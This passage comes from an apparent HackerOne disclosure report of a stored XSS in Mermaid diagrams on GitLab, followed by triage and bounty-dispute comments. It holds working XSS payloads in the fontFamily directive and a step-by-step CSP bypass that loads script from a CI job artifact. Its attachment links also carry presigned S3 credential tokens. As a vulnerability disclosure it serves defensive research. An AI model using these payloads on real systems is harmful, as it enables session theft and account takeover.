Later that config is used to generate new CSS rules:\n\n```\n  let userStyles = '';\n  // user provided theme CSS\n  if (cnf.themeCSS !== undefined) {\n    userStyles += `\\n${cnf.themeCSS}`;\n  }\n  // user provided theme CSS\n  if (cnf.fontFamily !== undefined) {\n    userStyles += `\\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;\n  }\n  // user provided theme CSS\n  if (cnf.altFontFamily !== undefined) {\n    userStyles += `\\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;\n  }\n```\n\n## Vulnerability description\n\nProblem is that there is no sanitization of user-supplied values, which are added to `style` tag via `innerHTML` method afterwards:\n```\n  const stylis = new Stylis();\n  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));\n\n  const style1 = document.createElement('style');\n  style1.innerHTML = rules;\n  svg.insertBefore(style1, firstChild);\n```\n\nThis leads to Cross-Site Scripting attack via following directive:\n```\n%%{init: { 'fontFamily': '\\\"\u003e\u003c/style\u003e\u003cimg src=x onerror=alert(document.cookie)\u003e'} }%%\n```\n## Steps to reproduce\n\n1. Create an issue in any repository\n2. Create mermaid diagram with following payload:\n```\n%%{init: { 'fontFamily': '\\\"\u003e\u003c/style\u003e\u003cimg src=x onerror=alert(document.cookie)\u003e'} }%%\nsequenceDiagram\nAlice-\u003e\u003eBob: Hi Bob\nBob-\u003e\u003eAlice: Hi Alice\n```\n\n3. Save the issue. XSS will be triggered every time a user opens a page with this issue.\n\n## PoC\nVisit https://gitlab.com/bugbountyuser1/asdf/-/issues/3\nYou will see CSP errors in the console. \n\n{F1195539}\n\n## What is the current *bug* behavior?\n\nMermaid fails to properly sanitize user-supplied input via directive which leads to XSS.\n\n## What is the expected *correct* behavior?\n\nMermaid strips/encodes malicious characters, so there is no way to perform XSS attack.\n\n## Output of checks\n\nThis vulnerability was tested on gitlab.com. CSP blocks XSS from executing, but I have an idea on how to bypass CSP.\nOn a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.\n\n### Results of GitLab environment info\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n## Impact\n\nThe Impact is standard as for any Stored XSS. User interaction is minimal - the user needs to navigate to a page with a Mermaid chart(issues page, etc). CSP is blocking XSS on gitlab.com, but I can work on XSS bypass if it is needed to show the impact/increase bounty amount. So let me know if you need CSP bypass too.","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1195539,"file_name":"2021-02-14_19-00.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2a2fct4tbhdvjgxnnl5vhivj6ifz?response-content-disposition=attachment%3B%20filename%3D%222021-02-14_19-00.png%22%3B%20filename%2A%3DUTF-8%27%272021-02-14_19-00.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJIO5LUY%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132444Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJGMEQCIDSzlg00hmiY8SKrGreVtNoMLQjEiCw6t6oEyA%2FsmU%2BXAiBpyUu02MMoiYLrZvREKmQg5iFaXBaQDOAfdsodU%2FdTzyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMt%2BNu9EHH6F1YrtDrKtcDlxN7DtwGfMbt4FPWDeJ%2Bv9c5rbIcX9cAEEqxJYLzJL7XQby13DWG5FPcm6FyEelS9pS99w608bFzjC3LswJsF3ziB00J0zddGDnpoT1EleYU3VzD3ULK1rar1tG4vFfsR40ftI4fxgz8xygldUPfGmR6yoOKn3s0gewUOGtFb48fR93fy%2BhyDsoMniu93hqO3QsrTYxgXAMOyZYH4KWCax6nWcKcVM97S1TSOm8t9SZ0HgbWWC46ZBj1pAotwtOa4CfLOrRYqmRpEQ4W%2BXz69nDHRZrLiyfHJRB1AfQla3UZmjt27KLWN2H9qRHZ0bgVCnxPnDLifs2wCJG%2FEGhEDB0romYWRi2gNFBtMkZv0GGsq0ZOWswyvgfzoVbJJdTeWGaYGRZo8I8u4pA%2BY4ESQTGVdcUMDVdV%2Bb3JJTvFZY4EkMEQ32hDhw8FFMRAksf7L2TRHc1bldE8HF7rc%2Fj9%2FV2JFNqie6zPYkKlg6yVUO%2Ff0hgwHlvWGpYo%2FB8wnvZIpuQqzfqMbiz9kmutD4jbKXpteFa8z%2BwK3GVY%2FueaXvEW06A3Nb0cHPdu7HPOe71hzSq47V89FBmfHgFBtMypOO%2BW0bmvb9v7eDmUbX7YY%2B%2BMsmyl1tehMMvEkIsGOqYBH3NvJOPeh%2FYCJz529hl3JFXiZ4mIrcvr4pynox0h4Mp1nIPFOWMxUGxA%2FVzT%2BE178l8UQb%2BPYHhLxS5Eirk9gIzgjO%2FbybMlO0U6498Dz8lERZ3gNZVXPq4Pqfzhsb1Cnp4vQTuTTBGNHQUXRg78H56AMeStnoBGp9yuAWo2l5Y3GyRZ0XiMw%2Fi3C2ml9dQKwQ1QZs5b03K5hnqatzca0ZPYcMaJeQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=352401261cdfea2f5cfa7986c43e3bf87c2b8251d5845b511bfc640404e683df","file_size":174880,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":21,"voters":["xenx","obsesif","bombon","ali","iambouali","naategh","h4x0r_dz","not_khun_myat","akashhamal0x01","cryptographer","and 11 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10670522,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @taraszelyk,\n\nThank you for submitting this report!

It's a bit harder since our payload is injected into \u003cstyle\u003e tag via innerHTML, but I will try to explain all steps needed to perform XSS attack.\nFirst of all, we need to serve a JS code we want to execute somwehere on the gitlab.com Also, we need to have valid content-type(application/javascript) returned in the response. This can be achived by using CI/CD job artifacts. \n\n1. Create new project. \n2. Create a file `payload.js` with JS that will be executed in the victim's browser. For example:\n```\nalert(document.cookie)\n```\n\n3. Create .gitlab-ci.yml with such content:\n```\njs:\n  script: \"echo test\"\n  artifacts:\n    paths:\n    - payload.js\n    expire_in: 4 week\n```\nThis will trigger Gitlab CI and generate a job artfiact.\n\n4. Wait a minute while Gitlab CI finished a job and navigate to \"CI/CD\" -\u003e \"Jobs\" -\u003e Latest Job -\u003e Job artifacts\nYou will see a link to download `payload.js` job artifact. It should look like this: `https://gitlab.com/\u003cuser\u003e/csp/-/jobs/\u003cjob_id\u003e/artifacts/raw/payload.js`\nStore it for later.\n\n5. We are going to use the script from step 3 to bypass CSP since it is allowed to include scripts form gitlab.com.\nTo dynamically include a script we can use `\u003ciframe\u003e` with `srcdoc` attribute:\n```\n\u003ciframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"\u0026lt;script src=https://gitlab.com/\u003cuser\u003e/asdf/-/jobs/\u003cjob_id\u003e/artifacts/raw/payload.js\u0026gt; \u0026lt;/script\u0026gt;\\\"\u003e\n```\nHowever, since our payload is injected via innerHTML into `\u003cstyle\u003e` tag browser will not parse iframe and, therefore, will not include a script. But I have noticed that if we prepend `\u003ciframe\u003e` tag with `\u003ctitle\u003e` tag it will work again. I am not sure of the root cause of this behavior and will investigate it later, but it works here.\n\nSo our final payload which needs to be injected in any field that supports Markdown:\n```\n%%{init: { 'fontFamily': '\u003ctitle\u003e\u003ciframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"\u0026lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js\u0026gt; \u0026lt;/script\u0026gt;\\\"\u003e'} }%%\nsequenceDiagram\nAlice-\u003e\u003eBob: Hi Bob\nBob-\u003e\u003eAlice: Hi Alice\n```\n[PoC](https://gitlab.com/bugbountyuser1/csp/-/issues/1)\n{F1196286}\n\n","automated_response":false,"created_at":"2021-02-15T12:57:51.321Z","updated_at":"2021-02-15T12:57:51.321Z","actor":{"username":"taraszelyk","cleared":true,"url":"/taraszelyk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":1196286,"filename":"2021-02-15_14-51.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jdjfrlvmlab3ftb3ppwgvvype6jp?response-content-disposition=attachment%3B%20filename%3D%222021-02-15_14-51.png%22%3B%20filename%2A%3DUTF-8%27%272021-02-15_14-51.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJIO5LUY%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132444Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJGMEQCIDSzlg00hmiY8SKrGreVtNoMLQjEiCw6t6oEyA%2FsmU%2BXAiBpyUu02MMoiYLrZvREKmQg5iFaXBaQDOAfdsodU%2FdTzyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMt%2BNu9EHH6F1YrtDrKtcDlxN7DtwGfMbt4FPWDeJ%2Bv9c5rbIcX9cAEEqxJYLzJL7XQby13DWG5FPcm6FyEelS9pS99w608bFzjC3LswJsF3ziB00J0zddGDnpoT1EleYU3VzD3ULK1rar1tG4vFfsR40ftI4fxgz8xygldUPfGmR6yoOKn3s0gewUOGtFb48fR93fy%2BhyDsoMniu93hqO3QsrTYxgXAMOyZYH4KWCax6nWcKcVM97S1TSOm8t9SZ0HgbWWC46ZBj1pAotwtOa4CfLOrRYqmRpEQ4W%2BXz69nDHRZrLiyfHJRB1AfQla3UZmjt27KLWN2H9qRHZ0bgVCnxPnDLifs2wCJG%2FEGhEDB0romYWRi2gNFBtMkZv0GGsq0ZOWswyvgfzoVbJJdTeWGaYGRZo8I8u4pA%2BY4ESQTGVdcUMDVdV%2Bb3JJTvFZY4EkMEQ32hDhw8FFMRAksf7L2TRHc1bldE8HF7rc%2Fj9%2FV2JFNqie6zPYkKlg6yVUO%2Ff0hgwHlvWGpYo%2FB8wnvZIpuQqzfqMbiz9kmutD4jbKXpteFa8z%2BwK3GVY%2FueaXvEW06A3Nb0cHPdu7HPOe71hzSq47V89FBmfHgFBtMypOO%2BW0bmvb9v7eDmUbX7YY%2B%2BMsmyl1tehMMvEkIsGOqYBH3NvJOPeh%2FYCJz529hl3JFXiZ4mIrcvr4pynox0h4Mp1nIPFOWMxUGxA%2FVzT%2BE178l8UQb%2BPYHhLxS5Eirk9gIzgjO%2FbybMlO0U6498Dz8lERZ3gNZVXPq4Pqfzhsb1Cnp4vQTuTTBGNHQUXRg78H56AMeStnoBGp9yuAWo2l5Y3GyRZ0XiMw%2Fi3C2ml9dQKwQ1QZs5b03K5hnqatzca0ZPYcMaJeQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4e394a2879cf614a519d83348e7523ecf24ed422476525f476d894aaa726bc39"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10704050,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @taraszelyk,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.

Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2021-04-28T15:16:54.882Z","updated_at":"2021-04-28T15:16:54.882Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"taraszelyk","url":"/taraszelyk"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11549425,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @dcouture,\nSorry, but I disagree with your decision that these two reports are duplicates. \nThey are separate issues, though in one library. I've spent time to find both of them. And spent time to make them work in Gitlab environment. And yes, one \"fix\"(Mermaid upgrade) from your side was required to patch them. But it's only because I've disclosed two vulnerabilities at once to the maintainer of the library so he fixed them together. And even in the library, they were not patched by the same patch.\n\nBy your logic, I should have submitted one issue, wait till the patch, get bounty and then submit another to be sure that I will be rewarded for all work that was done. I don't want to do such things and I think that it's wrong, but I find it unfair to the researcher to say that they are duplicates and reward for only one issue. So, I believe, you should reconsider your decision.","automated_response":false,"created_at":"2021-04-28T15:39:35.507Z","updated_at":"2021-04-28T15:39:35.507Z","actor":{"username":"taraszelyk","cleared":true,"url":"/taraszelyk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11549637,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @taraszelyk,\n\nI understand your point of view and completely understand that this was two different issues in mermaid, but we are not the mermaid project.
